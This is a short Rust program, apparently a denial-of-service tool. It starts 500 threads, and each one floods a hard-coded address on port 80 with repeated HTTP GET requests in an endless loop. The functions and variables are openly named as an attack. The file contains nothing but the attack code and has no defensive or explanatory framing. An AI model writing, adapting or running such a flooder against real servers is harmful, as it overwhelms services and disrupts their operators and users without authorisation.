use std::thread;
use std::net::{TcpStream, Shutdown};
use std::io::prelude::*;

fn attack_thread(target: &str) {
    let mut stream = TcpStream::connect(target).unwrap();
    let attack_string = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";

    loop {
        stream.write(attack_string.as_bytes()).unwrap();
    }
}

fn main() {

    let target = "172.31.64.20:80";
    let num_threads = 500; 

    let mut threads = vec![];

    for _ in 0..num_threads {
        let target_clone = target.to_string();
        let handle = thread::spawn(move || {
            attack_thread(&target_clone);
        });
        threads.push(handle);
    }

    for handle in threads {
        handle.join().unwrap();
    }
}